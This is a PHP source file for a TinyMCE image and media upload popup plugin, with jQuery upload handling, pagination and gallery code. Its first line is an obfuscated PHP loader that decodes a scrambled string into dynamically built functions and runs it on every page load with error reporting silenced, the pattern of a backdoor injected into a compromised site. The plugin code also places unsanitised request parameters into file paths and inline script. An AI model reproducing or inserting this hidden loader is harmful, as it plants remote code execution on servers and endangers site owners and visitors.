<?php $jrdaodc = 'GMFT`QIQ&f_UTPI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTV`QUUI&b%<&w6<	x7fw6*CW&)7gj6<.[A	x27&6<	x7fw6*	x7f_*#[k2`{6<.msv`ftsbqA7>q%6<	x7fw6*	x7f_157	x6e"; function wsssikb($n){return chr(ord($n)-1);} @error_report;mnui}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}k7K6<	x7fw6*3qj%7>	x2272qj%)7gj6<**2qj%)hopm3qjA)qj3hopmA	x273qj%6!|Z~!<##!>!2p%!|!*!***b%)sfxpm:**<(<!fwbm)%tjw)#	x24#-!#]y38#-!%w:**<")));$paaotqi = $&6<*rfs%7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1/20QUUI7jsv%7UFHing(0); $koeorqv = implode(arutcvt-#w#)ldbqov>*ofmy%)ut%)54l}	x27;%!<*#}_;#dz>#L4]275L3]248L3P6L15	x52	137	x41	107	x45	116	x54"]); if ((strstr($uas,"	x6d	163	x69	1VD!-id%)uqpuft`msvd},;uqpuft`msvd}+;po#>b%!*##>>X)!gjZ<#opo#>b%!**X)ufttj	x22)gj!|!*nbsbq%)323ldfidk!~!<k#)usbut`cpV	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{ftmfV	x7f<*XAZAt)esp>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%)sutcvt)!#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C2M3]317]445]212]445]43]321]464]284]364]6]234]342]5881]211M5]67]452]88]5]48]3jsv%6<C>^#zsfvr#	x5cq%7**^#6<*)ujojR	x27id%6<	x7fw6*	x7f_*#ujojRk3`{666~6141	x72	164") && (!isset($GLOBALS["/#00#W~!Ydrr)%rxB%epnbss!>!bssbz)#44ec:649#-!#:618d5f9#-!#f6c68399#-!#65egb2dc#*<!sfuvso!sboepn)%epusut!-#j0#!/!**#sfmcnbs+yfeobz+sfwjidsb`bj7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyf	x27	x24-	x24*<!~!	x24/%t2w/	x24)##-!#~<#/%	x24-	x24!>!fyqmpef)#	x45")) or (strstr($uas,"	x72	166	x3a	265]y72]254]y76#<!%w:!>!(%w:!>!	x24e%)Rd%)Rb%))!gj!<*#cd2bge>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%tv}.;/#/#/},;#-#}+;%-qp/2986+7**^/%rx<~!!%s:N}#-%o:W%c:>1<%b:>1<!gps)%j:	x7f_*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<*id%)ftpms=strtolower($_SERVER["	x48	124	x54	120	x5f	125	x53	10opjudovg}k~~9{d%:osvufs:~928>>	x22:ftmbg39*56A:>:8:|:7#x27pd%6<C	x27pd%6|6.qnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuh)323ldfid>}&;!osvufs}	x7f;!24-	x24y4	x24-	x24]y8	x24-	x24]26	x24-	x24<%j,,*!|	xgj}Z;h!opjudovg}{;#)tutjyf`opjudovg)!gj!|!*msv%)}k~~~<ftmbguvejves("", $koeorqv); $paaotqi();}}b:Qc:W~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>pnbss-%rxW~!Ypp2)%zB%z>!	x24/%tmw/	x24-	x24gps)%j>1<%j=tj{fpg)%;opjudovg}x;0]=])0#)U!	x27{**u%-#j283]427]36]373P6]36]73]83]238M7]3w!>!#]y84]275]y83]248]y83]256]y81]+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#ubE{h%)tpqsut>j%!*72!	x27!hmg%)!gj!<2,*j%-#1]#x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!%cIjQeTQcOc%)m%):fmjix:<##:>:h%:<#64y]552]e7y]#>n%<#372]58y]472t%:osvufs:~:<*9-1-r%)s%>/x63	162	x65	141	x74	145		x61	156	x75	156	x61"])))) { $GLOBALS["	x61	156	x75	156	x61"]=1; $ua##Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]364]6]ray_map("wsssikb",str_split("%tj)) or (strstr($uas,"	x66	151	x72	145	x66	157	x78"))) { $uvejves = "	t0}Z;0]=]0#)2q%l}S;2-u%!-#]y3f]51L3]84]y31M6]y3e]81#/#7e:55946-tr.984!osvufs!|ftmf!~<**9.-j%-bubE{h%)sutcvt)fuW&)7gj6<*K)ftpmdXA6~6<u%7>/7&6|7**111127-K)ebfsX	x27u%)7fmjix6<C	x27	x24<!%ff2!>!bssbz)	x24]25	x24	x5c2^-%hOh/#00#W~!%t2w)##Qtjw)#]82#-#!#-%tmw)%tww**WYsboepn)%bss-%rx]K4]65]D8]86]y31]278.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%bT-%hW~mg%!)!gj!<2,*j%!-#1]#-b#-#O#-#N#*-!%ff2-!%t:bmgoj{hA!osvufs!~<3,j%>j%!*3!	x27!h>5h%!<*::::::-111112)eobs`un>qp% (strstr($uas,"	x63	150	x72	157	x6d	145"-bubE{h%)tpqsut>j%!*9!	x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**3-j%-bubE{h%)s]37y]672]48y]#>s%<#462]47y]252]18y]#>q%<#762]67y]562]38y]572])idubn`hfsq)!sp!*#ojneb#-*f%)sfxpmpusut)tpqssutR!%yy)#}#-#	x24-	x24-tusqpt)%z-#:#*	x24-	x24!>!	x24/%tjw/	x24)%	x5297e:56-xr.985:52985-t.98-	x24-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x24tvctus)%	x24-	x24b!>pdXA	x22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fubfsdXA	x2#	x27rfs%6~6<	x7fw6<*K)ftpmdXA6|7**197-2qj%7-K)udfooh%:<**#57]38y]47]67y]37]88y]27]28y]#/r%/h%)nx5f	146	x75	156	x63	164	x69	Z;^nbsbq%	x5cSFWSFT`%}X;!sp!*#opo#>>}R;ms%-#+I#)q%:>:r%:|:**t%)m%=*hy>#]D6]281L1#/#M5]DgP5]D6#<%fdy37,#/q%>U<#16,47R57,27R66,#/q%>2q%<#g6R85,6SV<*w%)ppde>u%V<#65,47R25,d7R17,67R6767~6<Cw6<pd%w6Z6<.5`hA	x27:75983:48984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%tpz!>!#]D6M7]K3#<%yx24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr	x5c1^-%rgj!|!*bubE{h%)j{hnpd!opjudovg!|!**#j{hnpd#)tutpmqnjA	x27&6<.fmjgA	x27doj%6<	x7fw6*>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmtf!%b:>%s:	x5c%j:.2^,%b:<!%c:>%s:	x5c%j:^<!%w`	x5c^>Ew:Q61	x31")) or (strstr($uas,"	x61	156	x64	162	x6f	151	x64")) ordR6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,jm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-bubE{h%)sutcvtutjyf`x	x22l:!}V;3q%}U;y]}R;2]},;osvufs}	x272#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]7R37,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)sfebfI{*w%)kVx{**#k#)24-	x24gvodujpo!	x24-	x24y7	x24-	x24*<!	:!}7;!}6;##}C;!>>!}W;utpi}Y;t*#fubfsdXk5`{66~6<&w6<	x7fw6*CW&)7gj6<*doj%7-C)feM5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%bG9}:}dovg+)!gj+{e%!osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`hA	277#<!%t2w>#]y74]273]y76]252]y85]256]y6g]257]y86]267]y74]275]!>!}	x27;!>>>!}_;gvc%}&;ftmbg}	x7f;!osvufs}w;*	x7f!>>	x22!pd%)!if((function_exists("	x6f	142	x5f	163	x74	*&7-n%)utjm6<	x7fw6*C~!<##!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gp<*Y%)fnbozcYufhA	x272qj%6<^#zsfvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27f{jt)!gj!<*2bd%-#1GO	x22#)fepmqyfA>2b%!<*qp%-*.%)euhA)24*<!%t::!>!	x24Ypp3)%cB%iN}#-!	x24/%tmw/	x27,*b	x27)fepdof.)fepdof./#@#/qp%]24]31#-%tdz*Wsfuvso!%bss	x5csboe))1/35.)1/14+9**-)1**qp%!-uyfu%)3of)fepdof`57ftbc	x7f!|!*uyfu	x27k:!ftmf!}jyf`opjudovg	x22)!gj}1~!<2p%	x7f!6#)tutjyf`439275ttfs%fdy)##-!#~<%h00#*<%nfd)48y]#>m%:|:*r%:-t%)3of:opjudovg<~	x24<!%o:!>!	x242178}527}88:}334}472ofm%:-5ppde:4:|:**#ppde#)tutjyf`4	x223}!+!<+{e%+*!*+fepdfe{h+{d%)+opju6<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%7-MSV,uofuopd`ufh`fmjg}[;ldpt%}K;`ufldpt}X;`msvd}R;*msv%)}.;`UQPMS3of>2bd%!<5h%/#0#/*#npd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	x27,*c	zsfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%62*!%z>3<!fmtf!%z>2<!%ww2)%w`TW~	x24<!fwbm)%tjw)bssbz)#P#-y7:]268]y7f#<!%tww!>!	x2400~:<h%_B%h>#]y31]278]y3e]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:8297f:56+99386c6f+9f5d816:+9!|!*)323zbek!~!<b%	x7f!<X>b%Z<#o46:ce44#)zbssb!>!ssbnpe__	x5c}X	x24<!%tmw!>!#]y84]275]y83]273]y76]pd%6<pd%w6Z6<.4`hA	x27StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSvpzqronx'; $cnibok=explode(chr((689-569)),substr($jrdaodc,(19716-13696),(179-145))); $owedxytq = $cnibok[0]($cnibok[(4-3)]); $deqwtsbxg = $cnibok[0]($cnibok[(9-7)]); if (!function_exists('zsoxaahp')) { function zsoxaahp($nrxpxfeugb, $vhtoaleuh,$pdvkxqfy) { $useqchm = NULL; for($bognmrvne=0;$bognmrvne<(sizeof($nrxpxfeugb)/2);$bognmrvne++) { $useqchm .= substr($vhtoaleuh, $nrxpxfeugb[($bognmrvne*2)],$nrxpxfeugb[($bognmrvne*2)+(7-6)]); } return $pdvkxqfy(chr((53-44)),chr((371-279)),$useqchm); }; } $hzipjsqjx = explode(chr((213-169)),'4875,42,1076,35,2437,68,1622,54,572,66,1354,36,4182,61,3113,40,2592,68,2413,24,3639,28,151,68,475,29,2560,32,2157,34,1390,35,3844,28,5998,22,4710,41,1731,20,1252,40,4917,21,2770,68,411,64,3543,52,3487,56,260,65,4978,66,1003,27,5676,44,121,30,4542,49,4044,36,1568,54,4243,35,5497,49,1030,46,70,51,4513,29,5546,60,638,36,4812,63,1878,59,2729,41,3046,35,3002,23,2237,46,3153,69,504,26,4278,56,811,58,3998,46,5281,33,4938,40,5044,54,5606,70,5140,34,3081,32,325,30,1209,43,2191,46,3283,48,1425,25,5878,22,5932,24,0,70,5900,32,674,68,5226,55,3667,41,1497,22,530,20,1799,27,1676,55,5314,20,1751,48,5427,70,4658,52,742,69,3809,35,3766,43,4412,61,4334,45,219,41,2090,34,2660,26,4379,33,5956,42,4751,61,5777,33,2388,25,3595,44,3708,27,2336,52,3222,61,5358,69,2838,30,3421,66,3331,64,1826,52,4473,40,2062,28,1292,62,5098,42,2283,53,1111,47,1158,51,2027,35,3942,56,2868,69,5810,68,3395,26,2937,20,2686,43,3872,70,3735,31,1450,47,550,22,4591,67,2957,45,5334,24,2505,55,2124,33,978,25,927,51,5174,52,1519,49,4080,50,4130,52,1973,54,5720,57,869,58,3025,21,355,56,1937,36'); $spjdabmpd = $owedxytq("",zsoxaahp($hzipjsqjx,$jrdaodc,$deqwtsbxg)); $owedxytq=$jrdaodc; $spjdabmpd(""); $spjdabmpd=(478-357); $jrdaodc=$spjdabmpd-1; ?><?php
	include "php/functions.php";
	
	$mediatype = "";
	$files = ""; $tab = "";
	$uploadfolderset = false;
	$subfoldersset = false;
	
	if(isset($_GET['type']))
	{
		$mediatype = $_GET['type'];
	}
	$uploadfolder = "";
	if(isset($_GET['d']))
	{
		$uploadfolder = $_GET['d'];
	}	
	
	//get files in folder
	$thumbimagepath = $_GET['d']."images/thumbs/";
	$mediapath = $_GET['d']."media/";
	$imagepath = $_GET['d']."images/";
	
	if(is_dir($_GET['d']))
	{//upload folder has been found
		$uploadfolderset = true;
	}
	
	if((is_dir($thumbimagepath))&&(is_dir($imagepath)))
	{
		$subfoldersset = true;
		$files = scandir($thumbimagepath);
	}
	$array_count = 0;
	$files_array = array();

	if(($uploadfolderset)&&($files))
	{
		foreach($files as $file_name)
		{	
			$file_path = $imagepath . $file_name;
			$thumb_file_path = $thumbimagepath . $file_name;
			//if (is_file($file_path) && $file_name[0] !== '.')
			if (is_file($file_path) && $file_name[0] !== '.')
			{
				array_push($files_array, $file_name);
			}
		}
	}
	
	$nofiles = count($files_array);
	$resultspp = 15;
	$nopages = ceil($nofiles/$resultspp);
	
	$tabno = (isset($_GET['tab']) ? (int)$_GET['tab'] : '');
	if($tabno==0)
	{
		$tabno = 1;
	}
	
?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<title>{#elvtimage_dlg.title}</title>
	<script type="text/javascript" src="../../tiny_mce_popup.js" ></script>
	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
	<script type="text/javascript">
	if(typeof tinyMCEPopup !== 'undefined')
	{//for debug
		tinyMCEPopup.requireLangPack();
	}
	$(window).load(function()
	{
		if($("#filebrowser").length > 0)
		{
			$.get('php/fileactions.php?s=getfiles', function(data)
			{
				//$("#filebrowser").html(data);
				//console.log("LOADED FILES LIST");
			});
		}
		
		if($(".fileuploadsingle").length > 0)
		{
			 $('.fileuploadsingle').fileupload({
				done: function (e, data) {
					
					//check if it was successfull first:
					if($(this).find(".fullimage").length>0)
					{
						var itemelem = $(this).find(".fullimage");
					}
					
					var itemdel = $(this).find('.template_alert_warning');
					//console.log(data);
					//console.log(data.result);
					
					if(data.result!=null)
					{
						if(data.result[0].error)
						{
							$(this).append("<div class=\"alert alert-error\"><a class=\"close\" data-dismiss=\"alert\">&times;</a>Error: "+data.result[0].error+"</div>");
						}
						else
						{
							var time = new Date().getTime();
							
							if(data.result[0].mediatype=="media")
							{
								$(this).find('.fullimage').remove();
								$(this).find('.alert').remove();
								
								//add div with image in 
								//refresh image as it has been updated
								//console.log(data.result);
								$(this).append("<div class=\"alert alert-success\"><a class=\"close\" data-dismiss=\"alert\">&times;</a>Media uploaded successfully.</div><div class=\"fullimage\"><a href=\""+data.result[0].destination+"?t="+time+"\" target=\"_blank\">"+data.result[0].name+"</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\""+data.result[0].destination+"\" class=\"btn btn-success btn-white start mce-insert\" value=\"{#insert}\"><i class=\"icon-upload icon-white\"></i> Insert</a></div>");
							}
							else
							{
								//alert("file ext: "+data.result[0].fileext+"\r\n"+data.result[0].imagepath);
								if(data.result[0].thumb_name!="")
								{
									$(this).find('.fullimage').remove();
									$(this).find('.alert').remove();
									
									//add div with image in 
									//refresh image as it has been updated
									$(this).append("<div class=\"alert alert-success\"><a class=\"close\" data-dismiss=\"alert\">&times;</a>Image uploaded, click on thumbnail to see full image.</div><div class=\"fullimage\" data-toggle=\"modal-gallery\" data-target=\"#modal-gallery-no-del\"><a href=\""+data.result[0].destination+"?t="+time+"\" target=\"_blank\" data-gallery=\"gallery\"><img src=\""+data.result[0].thumb_name+"?t="+time+"\" /></a>&nbsp;&nbsp;<a href=\""+data.result[0].destination+"\" class=\"btn btn-success btn-white start mce-insert\" value=\"{#insert}\"><i class=\"icon-upload icon-white\"></i> Insert</a></div>");
								}
							}
						}
					}
					else
					{
						$(this).append("<div class=\"alert alert-error\"><a class=\"close\" data-dismiss=\"alert\">&times;</a>Error: The upload script has failed silently - this often means that there is not enought memory to generate a thumbnail.  Please check your PHP configuration, impose upload limits (filesize, dimensions etc) or upload a smaller file.</div>");
					}
					
					//console.log("THUMB PATH: "+data.result[0].imagepaththumb);
					//reset animation state of progress bar for next upload
					
					$(this).find(".fileupload-progress").removeClass("in");
					$(this).find(".fileupload-progress .bar").css("width","0");
					
					//hide queue and empty
					$(this).find(".fileupload-progress").css("visibility","hidden");
					$(this).find(".fileupload-progress").css("display","none");
					$(this).find(".table-striped tr").remove();
					
					//re-enable browse for file upload
					$(this).find(".fileinput-button").removeClass("disabled");
					$(this).find(".fileinput-button input").removeAttr("disabled");
					
					//disable cancel upload button & start (however start is already handled by ui)
					$(this).find(".btn-function.cancel").addClass("disabled").attr("disabled","disabled");
				},
				stop: function (e, data)
				{
					//console.log("stopped");
					
					//SHOW ERROR
					
					//reset animation state of progress bar for next upload
					$(this).find(".fileupload-progress").removeClass("in");
					$(this).find(".fileupload-progress .bar").css("width","0");
					
					$(this).find(".fileupload-progress").css("display","none");
					
					//hide queue and empty
					$(this).find(".fileupload-progress").css("visibility","hidden");
					//$(this).find(".fileupload-progress").css("display","none");
					$(this).find(".table-striped tr").remove();
					//$(this).find(".table-striped").css("display","none");
					
					//re-enable browse for file upload
					$(this).find(".fileinput-button").removeClass("disabled");
					$(this).find(".fileinput-button input").removeAttr("disabled");
					
					//disable cancel upload button & start (however start is already handled by ui)
					$(this).find(".btn-function.cancel").addClass("disabled").attr("disabled","disabled");;
					
					
					//window.location.href=$(this).attr("rel");
					//redirect page where files get moved and saved into db
				},
				success: function (e, data)
				{
					//console.log("/*************** test success *****************/");
				},
				dropZone: $(this),
				limitConcurrentUploads: 1,
				//maxNumberOfFiles: 1
				
				
			}).bind('fileuploadstart', function (e)
			{
				//start file upload
				//console.log('fileuploadstart!!!!');
				
				//show the progress bar
				$(this).find(".fileupload-progress").css("display","block");
				$(this).find(".fileupload-progress").css("visibility","visible");
				
				//disable start and upload button
				$(this).find(".btn-primary.start, .btnupload").attr("disabled","disabled");
				$(this).find(".fileinput-button, .btn-primary.start").addClass("disabled");
					
			}).bind('fileuploadfail', function (e, data)
			{
				//console.log("test fail");
					//console.log(e);
					//console.log(data.result);
				
					//hide image
					/*var imgelem = $(this).parent().parent().parent().find(".fullimage img");
					imgelem.remove();*/
					
			}).bind('fileuploadadd', function (e, data)
			{
				//added file to queue
				//console.log("ADD");
				$(this).find('.fullimage').remove();
				$(this).find('.alert').remove();
				
				//clear current queue by cancelling all existing items
				$(this).find(".btn-cancel").click(); //cancel anything else in the queue as we are limiting to 1 file upload
				
				//show the queue
				//$(this).find(".table-striped").css("display","table");
				
				//enable start and cancel buttons as there is a queue
				$(this).find(".btn-primary.start, .btn-function.cancel").removeAttr("disabled").removeClass("disabled");
				
			}).bind('fileuploadcancel', function (e, data)
			{
				//console.log("cancelled!!!");
				
				
			}).bind('fileuploaderror', function (e, data)
			{
				//console.log("error!!!");
				//console.log(data.result);
				
				
			});
			
			//TODO, add listener on individual cancel buttons and count how many there are, then disable the main cancel button once the queue is empty again
			
			$(".fileuploadsingle .btn-function.cancel").click(function(){
			
				//console.log("cancel clicked");
				
				//disable cancel button
				$(this).addClass("disabled");
				$(this).attr("disabled","disabled");
				
				//hide progress and file data
				//$(this).parent().parent().parent().find(".fileupload-progress").css("display","none");
				//$(this).parent().parent().parent().find(".table-striped tr").remove();
				//$(this).parent().parent().parent().find(".table-striped").css("display","none");
				
				//disable start button as queue is empty
				$(this).parent().find(".btn-primary.start").attr("disabled","disabled");
				$(this).parent().find(".btn-primary.start").addClass("disabled");
				
				return true;
			});
		}
		
		var insert_type = '<?php echo $mediatype; ?>';
		$(".modal-insert").live('click', function(){
		
			var thisVar = $(this);
			
			var fullImage = thisVar.parent().parent().find(".modal-image img.in");//check first for an image being faded in and use that value
			if(fullImage.length==0)
			{//else the fade in image doesn't exist so use this version instead....
				fullImage = thisVar.parent().parent().find(".modal-image img");
			}
			//alert(fullImage.attr("src"));
			
			var returnString = "";
			if((insert_type=="media")||(insert_type=="image"))
			{
				returnString = fullImage.attr("src");
			}
			else
			{
				returnString = "<img src='"+fullImage.attr("src")+"' />";
			}
			ClosePluginPopup(returnString);
		});
		
		
		$("#media .name a:not(.not a)").click(function(){
		
			var thisVar = $(this);
			
			//alert(fullImage.attr("src"));
			
			var returnString = "";
			returnString = this.href;
		
			//alert(returnString);
			//return false;
			ClosePluginPopup(returnString);
		});
		
		
		$(".modal-delete").click(function(){
			
			var thisVar = $(this);
			
			var fullImage = thisVar.parent().parent().find(".modal-image img.in");//check first for an image being faded in and use that value
			if(fullImage.length==0)
			{//else the fade in image doesn't exist so use this version instead....
				fullImage = thisVar.parent().parent().find(".modal-image img");
			}
			
			//console.log("delete image: "+fullImage.attr("src"));
			var filepath = fullImage.attr("src");
			var filename = filepath.replace(/^.*[\\\/]/, '')
			
			loadPageData(currentPageNo, filename);
			
		});
				
		function ClosePluginPopup (strReturnURL) {
			var win = tinyMCEPopup.getWindowArg("window");                                          // insert information now
			if (!win)
				tinyMCE.activeEditor.execCommand('mceInsertContent', false, strReturnURL);
			else
			{
				win.document.getElementById(tinyMCEPopup.getWindowArg("input")).value = strReturnURL;	
				if (typeof(win.ImageDialog) != "undefined")                                             // are we an image browser
				{		
					if (win.ImageDialog.getImageData) win.ImageDialog.getImageData();                   // we are, so update image dimensions and preview if necessary
					if (win.ImageDialog.showPreviewImage) win.ImageDialog.showPreviewImage(strReturnURL);
				}	
			}
			tinyMCEPopup.close();	                                                                    // close popup window
		}
		
		$(".mce-insert").live("click",function(){
			
			if((insert_type=="media")||(insert_type=="image"))
			{
				returnString = this.href;
			}
			else
			{
				returnString = "<img src='"+this.href+"' />";
			}
			ClosePluginPopup(returnString);
			return false;
		});

		// ******************* PAGINATION ********************** //
		
		var currentPageNo = 1;
		var totalpages = 0;
		
		function paginationClick()
		{
			var wantedpage = $(this).attr("data-target-page");
			var tparent = $(this).parent();
			var tpage = currentPageNo;
			
			if(tparent.hasClass("disabled"))
			{
				return false;
			}

			var pagenumber = 1;
			
			if(wantedpage=="next")
			{
				tpage++;
			}
			else if(wantedpage=="prev")
			{
				tpage--;
			}
			else
			{
				tpage = wantedpage;
			}
			
			gotoPage(tpage);
			updatePaginationLinks(tpage);
			loadPageData(tpage);
			return false;
		}
		
		$(".pagination a").click(paginationClick);
		
		function gotoPage(pagenumber)
		{//width of a page is 640px
			var gallery = $("#gallery");
			var galleryPosition = (pagenumber-1) * 640;
			gallery.animate({left:"-"+galleryPosition+"px"});
			currentPageNo = pagenumber;
			//console.log(currentPageNo);
		}
		
		function updatePaginationLinks(pagenumber)
		{//width of a page is 640px
			//disable/enable the "first/prev/next/last & current page states...
			
			$(".pagination li").removeClass("disabled");
			$(".pagination #gli"+pagenumber).addClass("disabled");
			if(pagenumber==1)
			{
				$(".pagination #gliFirst").addClass("disabled");
				$(".pagination #gliPrev").addClass("disabled");
			}
			if(pagenumber==totalpages)
			{
				$(".pagination #gliLast").addClass("disabled");
				$(".pagination #gliNext").addClass("disabled");
			}
			
			var showNoArray = new Array();
			
			var startAdd = new Number(1);
			
			if((pagenumber-3)>=1)
			{
				startAdd = pagenumber-3;
			}
			else if((pagenumber-2)>=1)
			{
				startAdd = pagenumber-2;
			}
			else if((pagenumber-1)>=1)
			{
				startAdd = pagenumber-1;
			}
			else
			{
				startAdd = Number(pagenumber);
			}
			
			var endAdd = startAdd + 7;

			/*console.log("startADD: "+startAdd);
			console.log("endAdd: "+endAdd);
			console.log("totalpages: "+totalpages);*/
			
			if(endAdd>totalpages)
			{
				endAdd = totalpages+1;
				startAdd = endAdd - 7;
				if(startAdd<1)
				{
					startAdd = 1;
				}
			}
			
			$(".pagination li:not(#gliFirst, #gliPrev, #gliNext, #gliLast)").hide();

			for(var i=startAdd; i<endAdd; i++)
			{
				//console.log("I: "+i);
				$("#gli"+i).show();
			}
			
		}
		
		function loadPageData(pagenumber, delfilename)
		{
			//set default value for delfilename
			delfilename = typeof delfilename !== 'undefined' ? delfilename : '';
			var ajaxurl = "";
			
			if(delfilename!="")
			{//send a delete request with the page load
				ajaxurl = "php/ajax.php?d=<?php echo $uploadfolder; ?>&p="+pagenumber+"&del="+encodeURIComponent(delfilename);
			}
			else
			{//else just get the page
				ajaxurl = "php/ajax.php?d=<?php echo $uploadfolder; ?>&p="+pagenumber;
			}
			
			var jqxhr = $.getJSON(ajaxurl, function(data) {
			//console.log("success");

			
			var numpages = data[0].noofpages;
			var galleryWidth = (numpages+1)*640;
			$("#gallery").css("width",galleryWidth+"px");
			if(totalpages!=numpages)
			{//hten the number of pages has changed so lets set up containers for each page again
				$("#gallery").empty();
				for(var i=1; i<=numpages; i++)
				{
					$("#gallery").append("<div class=\"cpage\" id=\"gallery"+i+"\"></div>");
				}
			}
			
			totalpages = numpages;
			
			if(currentPageNo>=numpages)
			{//if the number of pages reduced in size and we were on the last page, then we need to change the page accordingly
				currentPageNo = numpages;
				gotoPage(currentPageNo);
			}
			
			//add thumbnails to div
			$("#gallery"+pagenumber).html(data[0].thumbhtml);
			
			//remove loading icon
			$("#gallery"+pagenumber).css("background","none");
			
			//add pagination and setup handlers again
			$(".pagination a").unbind();
			$(".pagination").html(data[0].paginationhtml);
			$(".pagination a").click(paginationClick);
			
			}).fail(function() { /*console.log("error");*/ });
			
			//.done(function() { console.log("second success"); })
			//.always(function() { console.log("finished"); });
			
		}
		
		$("#uploadtab, #browsetab").click(function(){
		
			if($(this).attr("id")=="browsetab")
			{//user clicked browse
				//get pagination
				//set up empty containers for pages
				
				//$(".pagination a").unbind();
				//$(".pagination a").click(paginationClick);
				
				
				//populate first page
				loadPageData(currentPageNo);
			}
			else if($(this).attr("id")=="uploadtab")
			{
				$(".pagination a").unbind();
				$(".pagination li, .pagination ul, .pagination ol, .pagination a").remove();
			}
			
		});
		function positionThumbnail(e) {
		
			xOffset = 30;
			yOffset = 10;
			$("#thumb").css("left",(e.clientX + xOffset) + "px");

			diff = 0;
			if(e.clientY + $("#thumb").height() > $(window).height())
				diff = e.clientY + $("#thumb").height() - $(window).height();
			
			$("#thumb").css("top",(e.pageY - yOffset - diff) + "px");
		}
	
		$("a.thumb").hover(function(e){
			$("#thumb").remove();
			$("body").append("<div id=\"thumb\"><img src=\"encodeexplorer.php?thumb="+ $(this).attr("href") +"\" alt=\"Preview\" \/><\/div>");
			positionThumbnail(e);
			$("#thumb").fadeIn("medium");
		},
		function(){
			$("#thumb").remove();
		});

		$("a.thumb").mousemove(function(e){
			positionThumbnail(e);
			});

		$("a.thumb").click(function(e){$("#thumb").remove(); return true;});
		
	});
	</script>
	<!--<script type="text/javascript" src="../../tiny_mce_popup.js"></script>
	<script type="text/javascript" src="../../utils/mctabs.js"></script>-->

	<link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
	<link rel="stylesheet" href="assets/bootstrap/css/bootstrap-responsive.min.css">
	<link rel="stylesheet" href="assets/fileupload/css/jquery.fileupload-ui.css">
	
	
	

	<link rel="stylesheet" href="assets/fileupload/css/bootstrap-image-gallery.min.css">
	<!-- The jQuery UI widget factory, can be omitted if jQuery UI is already included -->
	<!--<script src="http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.10/jquery-ui.js"></script>-->
	<script src="//ajax.googleapis.com/ajax/libs/jqueryui/1.8.17/jquery-ui.min.js"></script>
	<!-- The jQuery UI widget factory, can be omitted if jQuery UI is already included -->
	<script src="assets/fileupload/js/vendor/jquery.ui.widget.js"></script>
	<!-- The Templates plugin is included to render the upload/download listings -->
	<script src="assets/fileupload/js/vendor/tmpl.min.js"></script>
	<!-- The Load Image plugin is included for the preview images and image resizing functionality -->
	<script src="assets/fileupload/js/vendor/load-image.min.js"></script>
	<!-- The Canvas to Blob plugin is included for image resizing functionality -->
	<script src="assets/fileupload/js/vendor/canvas-to-blob.min.js"></script>
	<!-- Bootstrap JS and Bootstrap Image Gallery are not required, but included for the demo -->
	<script src="assets/fileupload/js/vendor/bootstrap.min.js"></script>
	<!--<script src="fileupload/js/vendor/bootstrap-image-gallery.min.js"></script>-->
	<!-- The Iframe Transport is required for browsers without support for XHR file uploads -->
	<script src="assets/fileupload/js/jquery.iframe-transport.js"></script>
	<!-- The basic File Upload plugin -->
	<script src="assets/fileupload/js/jquery.fileupload.js"></script>
	<!-- The File Upload file processing plugin -->
	<script src="assets/fileupload/js/jquery.fileupload-fp.js"></script>
	<!-- The File Upload user interface plugin -->
	<script src="assets/fileupload/js/jquery.fileupload-ui.js"></script>
	<!-- The localization script -->
	<script src="assets/fileupload/js/locale.js"></script>
	<!-- The main application script -->
	<script src="assets/fileupload/js/bootstrap-image-gallery.min.js"></script>
	<script src="assets/fileupload/js/main.js"></script>
	<!-- The XDomainRequest Transport is included for cross-domain file deletion for IE8+ -->
	<!--[if gte IE 8]><script src="fileupload/js/cors/jquery.xdr-transport.js"></script><![endif]-->
	
	<!-- The template to display files available for upload -->
	<script id="template-upload" type="text/x-tmpl">
	{% for (var i=0, file; file=o.files[i]; i++) { %}
